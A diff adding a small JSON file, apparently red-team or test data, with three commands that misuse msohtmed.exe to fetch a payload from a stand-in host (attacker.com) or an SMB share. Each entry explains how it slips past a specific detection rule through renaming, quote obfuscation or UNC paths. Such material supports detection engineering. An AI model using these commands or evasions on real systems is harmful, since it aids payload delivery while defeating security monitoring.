@@ -1,0 +1,14 @@
+[
+  {
+    "output": "copy C:\\Windows\\System32\\msohtmed.exe C:\\Users\\Public\\not_an_editor.exe && C:\\Users\\Public\\not_an_editor.exe \"https://attacker.com/payload.exe\"",
+    "explanation": "The rule relies on the 'Image' field ending in '\\MSOHTMED.exe' or the 'OriginalFileName' being 'MsoHtmEd.exe'. While OriginalFileName is harder to spoof, many basic SIEM configurations only log the process path (Image). By copying the executable to a new name, the 'Image|endswith' condition is bypassed. If the EDR/SIEM does not support or has not collected the 'OriginalFileName' metadata, the detection fails."
+  },
+  {
+    "output": "msohtmed.exe \"h\"tt\"p\"s\"://attacker.com/payload.exe\"",
+    "explanation": "The rule uses a simple 'contains' check for 'https://'. Depending on how the OS parses the command line and how the SIEM pre-processes strings, using environmental variables or double quotes (which are often stripped by the shell but can break simple pattern matching in certain logs) can bypass string-literal detections."
+  },
+  {
+    "output": "msohtmed.exe \"\\\\10.0.0.5\\share\\payload.exe\"",
+    "explanation": "The rule specifically looks for protocol handlers 'ftp://', 'http://', and 'https://'. It fails to account for UNC paths (SMB). If msohtmed.exe is used to fetch a file from a remote SMB share, the file is still downloaded/accessed from a remote source, but the command line will not trigger the 'selection_cli' filters."
+  }
+]
